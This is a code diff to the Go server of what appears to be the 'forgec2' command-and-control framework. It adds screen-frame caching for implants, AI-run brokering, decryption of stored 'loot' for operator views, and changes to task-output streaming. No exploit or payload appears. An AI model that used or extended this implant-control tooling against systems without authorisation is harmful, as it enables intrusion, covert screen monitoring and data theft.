@@ -24,6 +24,7 @@ import (
 	"github.com/forgec2/forgec2/internal/config"
 	"github.com/forgec2/forgec2/internal/crypto"
 	"github.com/forgec2/forgec2/internal/db"
+	"github.com/forgec2/forgec2/internal/payload"
 	"github.com/forgec2/forgec2/internal/plugin"
 	"github.com/forgec2/forgec2/internal/server/middleware"
 	"github.com/forgec2/forgec2/internal/server/opsec"
@@ -60,6 +61,8 @@ type Server struct {
 	udpConn               net.PacketConn
 	screenMonitorImplants map[string]time.Time
 	screenMonitorMu       sync.Mutex
+	screenFrames          map[string]cachedScreenFrame
+	screenFrameMu         sync.RWMutex
 
 	// P0-3: rportfwd (reverse port forward)
 	rportfwdListeners map[string]*rportfwdRelay
@@ -100,6 +103,11 @@ type Server struct {
 
 	// Event system
 	eventManager *EventManager
+
+	// AI runs are detached from individual HTTP requests. The broker only keeps
+	// live subscribers and cancellation handles; replayable events live in DB.
+	aiRuns        *aiRunBroker
+	aiRunCreateMu sync.Mutex
 
 	// Per-(agent,domain) consecutive-failure fuse for credential checks
 	credCheckFuse *credCheckFuseTracker
@@ -183,12 +191,12 @@ type Server struct {
 	landingLimiterSince map[string]time.Time
 
 	// External C2 channels (WebSocket relay, Discord, Slack)
-	extC2Channels   map[string]*extC2WSChannel
+	extC2Channels map[string]*extC2WSChannel
 	// extC2Runners tracks LIVE poller instances (Discord/Slack) so a deleted
 	// channel can actually be stopped — previously the delete handler only
 	// removed the metadata entry and the run loop kept reconnecting with the
 	// "deleted" bot token until process restart.
-	extC2Runners     map[string]extC2Runner
+	extC2Runners    map[string]extC2Runner
 	extC2ChannelsMu sync.Mutex
 	extC2TaskQueue  map[string][]extC2Task
 	extC2TaskMu     sync.Mutex
@@ -297,6 +305,7 @@ type BulkResult struct {
 const maxBulkHistory = 50
 
 func New(cfg *config.Config, database *gorm.DB) *Server {
+	payload.SetConfiguredGoProxy(cfg.Implant.GoProxy)
 	gin.SetMode(gin.ReleaseMode)
 
 	if err := middleware.InitJWTSecret(cfg, ""); err != nil {
@@ -344,6 +353,7 @@ func New(cfg *config.Config, database *gorm.DB) *Server {
 		tunEngine:             newTunEngine(),
 		startTime:             time.Now(),
 		screenMonitorImplants: make(map[string]time.Time),
+		screenFrames:          make(map[string]cachedScreenFrame),
 		rportfwdListeners:     make(map[string]*rportfwdRelay),
 		lportfwdTargets:       make(map[string]*lportfwdTarget),
 		lportfwdDeclared:      make(map[string]map[string]bool),
@@ -401,6 +411,8 @@ func New(cfg *config.Config, database *gorm.DB) *Server {
 	}
 
 	s.ctx, s.ctxCancel = context.WithCancel(context.Background())
+	s.aiRuns = newAIRunBroker()
+	s.initializeAIRuns()
 
 	// Beacon dedup cache cleanup (bounded to prevent memory exhaustion)
 	s.wg.Add(1)
@@ -1087,6 +1099,7 @@ func (s *Server) broadcastAgentDataUpdate(agentID string, data map[string]interf
 
 // broadcastTaskUpdate pushes task status (and result if completed) to WS clients
 func (s *Server) broadcastTaskUpdate(agentID string, task db.Task) {
+	task = taskForOperator(task)
 	payload := map[string]interface{}{
 		"type":       "task_update",
 		"agent_id":   agentID,
@@ -1096,14 +1109,22 @@ func (s *Server) broadcastTaskUpdate(agentID string, task db.Task) {
 		"command":    task.Command,
 		"created_by": task.CreatedBy,
 	}
-	if task.Result != "" && task.Type == "shell" && task.Status == "completed" && len(task.Result) > TaskOutputStreamThreshold {
-		// Large shell output is streamed in ordered frames first so the
-		// terminal can render incrementally instead of waiting for one big
-		// result. task_update carries only status + truncated preview.
-		s.broadcastTaskOutputFrames(agentID, task)
-		payload["result"] = truncateString(task.Result, 200)
+	if task.Result != "" && task.Type == "shell" && task.Status == "completed" {
+		if len(task.Result) > TaskOutputStreamThreshold {
+			// Large shell output is streamed in ordered frames. Do not attach a
+			// second truncated value that can be mistaken for the full result.
+			s.broadcastTaskOutputFrames(agentID, task)
+			payload["result_complete"] = false
+		} else {
+			// Small interactive-shell results fit comfortably in one WS frame.
+			// Mark this value explicitly so clients can distinguish it from the
+			// previews used by task list notifications.
+			payload["result"] = task.Result
+			payload["result_complete"] = true
+		}
 	} else if task.Result != "" {
 		payload["result"] = truncateString(task.Result, 200)
+		payload["result_complete"] = false
 	}
 	if task.Error != "" {
 		payload["error"] = task.Error
@@ -1114,6 +1135,29 @@ func (s *Server) broadcastTaskUpdate(agentID string, task db.Task) {
 		return
 	}
 	s.broadcastToClients(notification)
+}
+
+// taskForOperator is the final storage-boundary guard for task output. Most DB
+// reads are decrypted by db.Task.AfterFind, but result objects created by map
+// updates or passed directly from write paths may still contain FC2ENC values.
+// Never expose that at-rest representation through REST or WebSocket APIs.
+func taskForOperator(task db.Task) db.Task {
+	for fieldName, field := range map[string]*string{
+		"result": &task.Result,
+		"error":  &task.Error,
+	} {
+		if !strings.HasPrefix(*field, "FC2ENC:") {
+			continue
+		}
+		plain, err := crypto.DecryptLoot(*field)
+		if err != nil {
+			slog.Error("Failed to decrypt task field for operator response", "task_id", task.ID, "field", fieldName, "error", err)
+			*field = ""
+			continue
+		}
+		*field = plain
+	}
+	return task
 }
 
 // TaskOutputStreamThreshold: results above this size are chunked into
@@ -1259,6 +1303,18 @@ func (s *Server) cleanupStaleMapEntries() {
 		}
 	}
 	s.screenMonitorMu.Unlock()
+
+	// Live frames are kept in memory only as an HTTP fallback for consoles
+	// whose WebSocket briefly reconnects. Bound their lifetime with the same
+	// stale-map cleanup used by monitor registrations.
+	s.screenFrameMu.Lock()
+	for k, frame := range s.screenFrames {
+		if frame.capturedAt.Before(cutoff) {
+			delete(s.screenFrames, k)
+			cleaned++
+		}
+	}
+	s.screenFrameMu.Unlock()
 
 	// Clean empty extC2TaskQueue entries
 	s.extC2TaskMu.Lock()
@@ -1611,6 +1667,7 @@ func (s *Server) Run() error {
 	s.wg.Add(1)
 	go func() {
 		defer s.wg.Done()
+		s.recoverClaimedOneShotTasks()
 		ticker := time.NewTicker(20 * time.Second)
 		defer ticker.Stop()
 		for {
